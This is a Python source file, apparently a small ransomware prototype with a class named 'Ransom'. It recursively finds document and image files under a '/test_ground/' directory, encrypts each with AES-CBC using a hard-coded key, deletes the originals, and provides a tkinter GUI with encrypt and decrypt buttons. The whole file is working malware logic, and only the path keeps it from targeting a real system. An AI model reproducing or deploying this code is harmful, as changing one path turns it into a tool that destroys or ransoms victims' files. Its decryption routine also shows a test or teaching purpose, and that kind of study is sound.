#!/usr/bin/python
#@ credit to Eli Bendersky's website

from os import walk
import os, random, struct
from Crypto.Cipher import AES
from Crypto import Random
import tkinter


key = '0123456789abcdef'
path=os.path.abspath(os.sep)
path +='test_ground/'
extension=['jpg','txt','doc','png','ppt','pdf','docx','psd','ai','tif','dmg','7z']

class Ransom():
    def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
        """ Encrypts a file using AES (CBC mode) with the
            given key.

            key:
                The encryption key - a string that must be
                either 16, 24 or 32 bytes long. Longer keys
                are more secure.

            in_filename:
                Name of the input file

            out_filename:
                If None, '<in_filename>.enc' will be used.

            chunksize:
                Sets the size of the chunk which the function
                uses to read and encrypt the file. Larger chunk
                sizes can be faster for some files and machines.
                chunksize must be divisible by 16.
        """
        if not out_filename:
            out_filename = in_filename + '.enc'

        iv = Random.get_random_bytes(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))
        infile.close()
        os.remove(in_filename)

    def lookfor_files(mypath, type):
        f = []
        if(type=='enc'):
            for (dirpath, dirnames, filenames) in walk(mypath):
                for files in filenames:
                    if files.lower().split(".")[-1] in extension:
                        p = os.path.abspath(os.path.join(dirpath,files))
                        f.append(p)
        else:
            for (dirpath, dirnames, filenames) in walk(mypath):
                for files in filenames:
                    if (files.lower().split(".")[-1]=='enc'):
                        p = os.path.abspath(os.path.join(dirpath,files))
                        f.append(p)
        return set(f)

    def decryt_files(in_filename, out_filename=None, chunksize=64*1024):
        """ 
            Decrypts a file using AES (CBC mode) with the
            given key. Parameters are similar to encrypt_file,
            with one difference: out_filename, if not supplied
            will be in_filename without its last extension
            (i.e. if in_filename is 'aaa.zip.enc' then
            out_filename will be 'aaa.zip')
        """
        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]
        with open(in_filename,'rb') as infile:
            origsize = struct.unpack('<Q',infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key,AES.MODE_CBC,iv)

            with open(out_filename,'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk)== 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))


                outfile.truncate(origsize)
            infile.close()
            os.remove(in_filename)


    def encrypt_button():
        filenames = ()
        filenames = Ransom.lookfor_files(path,'enc')
        print(filenames)
        for f in filenames:
            Ransom.encrypt_file(key,f)

    def decrypt_button():
        filenames = ()
        filenames = Ransom.lookfor_files(path,'dec')
        for f in filenames:
            Ransom.decryt_files(f)


if __name__ == "__main__":
    top = tkinter.Tk()
    E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button)
    E.pack()
    D = tkinter.Button(top,text='dec',command = Ransom.decrypt_button)
    D.pack()
    top.mainloop()

